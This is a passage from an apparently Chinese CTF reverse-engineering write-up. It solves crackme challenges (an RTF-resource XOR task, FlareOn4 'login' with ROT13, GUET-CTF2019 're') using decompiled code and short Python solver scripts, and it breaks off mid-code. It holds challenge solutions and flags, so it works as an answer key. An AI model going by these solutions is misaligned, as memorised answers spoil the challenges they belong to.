punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211419121.png" alt="image-20220405211419121" /></p>
<p>跟进 <code>sub_40100F函数</code> 查看</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">char</span> __cdecl <span class="token function">sub_4014D0</span><span class="token punctuation">(</span>LPCSTR lpString<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  LPCVOID lpBuffer<span class="token punctuation">;</span> <span class="token comment">// [esp+50h] [ebp-1Ch]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  DWORD NumberOfBytesWritten<span class="token punctuation">;</span> <span class="token comment">// [esp+58h] [ebp-14h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  DWORD nNumberOfBytesToWrite<span class="token punctuation">;</span> <span class="token comment">// [esp+5Ch] [ebp-10h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  HGLOBAL hResData<span class="token punctuation">;</span> <span class="token comment">// [esp+60h] [ebp-Ch]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  HRSRC hResInfo<span class="token punctuation">;</span> <span class="token comment">// [esp+64h] [ebp-8h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  HANDLE hFile<span class="token punctuation">;</span> <span class="token comment">// [esp+68h] [ebp-4h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  hFile <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  hResData <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  nNumberOfBytesToWrite <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  NumberOfBytesWritten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  hResInfo <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token string">"AAA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hResInfo <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  nNumberOfBytesToWrite <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> hResInfo<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  hResData <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> hResInfo<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hResData <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  lpBuffer <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>hResData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token function">sub_401005</span><span class="token punctuation">(</span>lpString<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>lpBuffer<span class="token punctuation">,</span> nNumberOfBytesToWrite<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  hFile <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span><span class="token string">"dbapp.rtf"</span><span class="token punctuation">,</span> <span class="token number">0x10000000u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> <span class="token number">0x80u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> hFile <span class="token operator">==</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> lpBuffer<span class="token punctuation">,</span> nNumberOfBytesToWrite<span class="token punctuation">,</span> <span class="token operator">&amp;</span>NumberOfBytesWritten<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211535795.png" alt="image-20220405211535795" /></p>
<p>应该是从一个 AAA 的东西里面取出数据，然后将从 AAA 中取出的数据和我们传入的参数 —— 也就是输入的第二次密码连接后的字符串，传入一个 sub_401005 函数最后生成一个 dbapp.rtf 文件，看到这想起了题目的 RTF</p>
<p>跟进 <code>sub_401005函数</code> 查看，将我们从 AAA 取出的值和第二次密码连接后的字符串进行异或</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211653407.png" alt="image-20220405211653407" /></p>
<p>使用 ResourceHacker 查看 AAA 中的值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211849991.png" alt="image-20220405211849991" /></p>
<p>因为要生成一个.rtf 的文件，那肯定缺少不了文件头</p>
<p>取 AAA 文件的前 6 个字节，然后在做异或的逆向运算，与 rtf 头做逆向，就能得出第二次加密的密码</p>
<p>直接写脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s <span class="token operator">=</span> <span class="token string">"&#123;\\rtf1"</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x7D</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405212344739.png" alt="image-20220405212344739" /></p>
<p>得到第二次密码，进行验证，验证成功即会在本地生成一个 <code>dbapp.rtf</code>  文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405212503042.png" alt="image-20220405212503042" /></p>
<p>打开即可得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405212525153.png" alt="image-20220405212525153" /></p>
<h2 id="flareon4login"><a class="anchor" href="#flareon4login">#</a> [FlareOn4]login</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
<p>附件下载一个 html 网页和一个 Description 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406201833848.png" alt="image-20220406201833848" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>Hint<span class="token punctuation">:</span>本题解出相应字符串后请用flag<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>包裹，形如：flag<span class="token punctuation">&#123;</span><span class="token number">123456</span>@flare<span class="token operator">-</span>on<span class="token punctuation">.</span>com<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406201917174.png" alt="image-20220406201917174" /></p>
<p>输入 flag 进行 check</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406202008994.png" alt="image-20220406202008994" /></p>
<p>查看源码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406202054161.png" alt="image-20220406202054161" /></p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>document.getElementById("prompt").onclick = function () &#123;</pre></td></tr><tr><td data-num="2"></td><td><pre>	var flag = document.getElementById("flag").value;</pre></td></tr><tr><td data-num="3"></td><td><pre>	var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);</pre></td></tr><tr><td data-num="4"></td><td><pre>	if ("PyvragFvqrYbtvafNerRnfl@syner-ba.pbz" == rotFlag) &#123;</pre></td></tr><tr><td data-num="5"></td><td><pre>        alert("Correct flag!");</pre></td></tr><tr><td data-num="6"></td><td><pre>    &#125; else &#123;</pre></td></tr><tr><td data-num="7"></td><td><pre>        alert("Incorrect flag, rot again");</pre></td></tr><tr><td data-num="8"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="9"></td><td><pre>&#125;</pre></td></tr></table></figure><p>可以看到几个关键调用函数 <code>getElementById</code>  和 <code>charCodeAt</code> ，百度查看作用效果</p>
<ul>
<li><code>getElementById()</code>  方法可返回对拥有指定 ID 的第一个对象的引用</li>
<li><code>charCodeAt()</code>  方法可返回指定位置的字符的  <code>Unicode 编码</code> ，返回值是  <code>0 - 65535</code>  之间的整数，表示给定索引处的  <code>UTF-16</code>  代码单元</li>
</ul>
<p>根据以下代码可以知道它将字符后移 <code>13</code>  位，越界了就转到 <code>26</code>  个字母的开头，也就是说如果它超过 Z 循环回 A</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);</pre></td></tr></table></figure><p>循环进行，最后得到了字符串 <code>PyvragFvqrYbtvafNerRnfl@syner-ba.pbz</code></p>
<p>而根据位移效果可以判断这就是 <code>ROT13</code>  加密，在解码工具中尝试进行解码，得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406202911106.png" alt="image-20220406202911106" /></p>
<p>根据 hint 可以知道这就是 flag</p>
<p>编写 exp：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>a <span class="token operator">=</span> <span class="token string">'PyvragFvqrYbtvafNerRnfl@syner-ba.pbz'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span> i <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'M'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">elif</span> i <span class="token operator">>=</span> <span class="token string">'a'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'m'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">elif</span> i <span class="token operator">>=</span> <span class="token string">'N'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">"Z"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">elif</span> i <span class="token operator">>=</span> <span class="token string">'n'</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span> <span class="token string">'z'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        flag <span class="token operator">+=</span> i</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406203209417.png" alt="image-20220406203209417" /></p>
<h2 id="guet-ctf2019re"><a class="anchor" href="#guet-ctf2019re">#</a> [GUET-CTF2019]re</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
<p>查壳，发现有 upx 壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407202630638.png" alt="image-20220407202630638" /></p>
<p>脱壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407202754078.png" alt="image-20220407202754078" /></p>
<p>丢进 ida，查找字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407202917476.png" alt="image-20220407202917476" /></p>
<p>跟进查看</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>__int64 __fastcall <span class="token function">sub_400E28</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">,</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ecx</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er8</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// er9</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">sub_40F950</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"input your flag:"</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> a6<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">sub_40FA80</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v12 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">sub_443550</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407203005964.png" alt="image-20220407203005964" /></p>
<p>判断结果为真即可得到 flag</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>跟进 <code>sub_4009AE函数</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>_BOOL8 __fastcall <span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> <span class="token operator">*</span>a1 <span class="token operator">!=</span> <span class="token number">166163712</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">731332800</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">357245568</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">489211344</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">518971936</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">406741500</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">294236496</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">177305856</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">650683500</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">298351053</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">386348487</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">438258597</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">249527520</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">445362764</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token keyword">if</span> <span class="token 